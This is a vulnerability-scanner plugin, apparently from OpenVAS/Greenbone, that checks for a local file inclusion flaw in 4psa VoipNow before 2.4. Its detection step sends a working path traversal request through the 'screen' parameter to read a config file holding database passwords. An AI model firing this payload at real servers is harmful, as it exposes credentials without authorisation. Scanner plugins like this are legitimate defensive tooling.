if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803195" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-04-22 18:28:32 +0530 (Mon, 22 Apr 2013)" );
	script_name( "4psa Voipnow Local File Inclusion Vulnerability" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/121374" );
	script_xref( name: "URL", value: "http://bot24.blogspot.in/2013/04/voipnow-24-local-file-inclusion.html" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 443 );
	script_mandatory_keys( "voipnow/banner" );
	script_tag( name: "impact", value: "Successful exploitation will allow an attacker to view files and execute
  local scripts in the context of the application." );
	script_tag( name: "affected", value: "4psa voipnow version prior to 2.4" );
	script_tag( name: "insight", value: "The flaw is due to an improper validation of user-supplied input to
  the 'screen' parameter in '/help/index.php?', which allows attackers
  to read arbitrary files via a ../(dot dot) sequences." );
	script_tag( name: "solution", value: "Upgrade to 4psa voipnow 2.4 or later." );
	script_tag( name: "summary", value: "This host is running 4psa Voipnow and is prone to local file
  inclusion vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://www.4psa.com/products-voipnow-spe.html" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 443 );
res = http_get_cache( item: "/", port: port );
if(ContainsString( res, "VOIPNOW=" ) && ContainsString( res, "Server: voipnow" )){
	url = "/help/index.php?screen=../../../../../../../../etc/voipnow/voipnow.conf";
	req = http_get( port: port, item: url );
	res = http_keepalive_send_recv( port: port, data: req );
	if(ContainsString( res, "VOIPNOWCALLAPID_RC_D" ) && ContainsString( res, "VOIPNOW_ROOT_D" ) && ContainsString( res, "Database location" ) && ContainsString( res, "DB_PASSWD" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

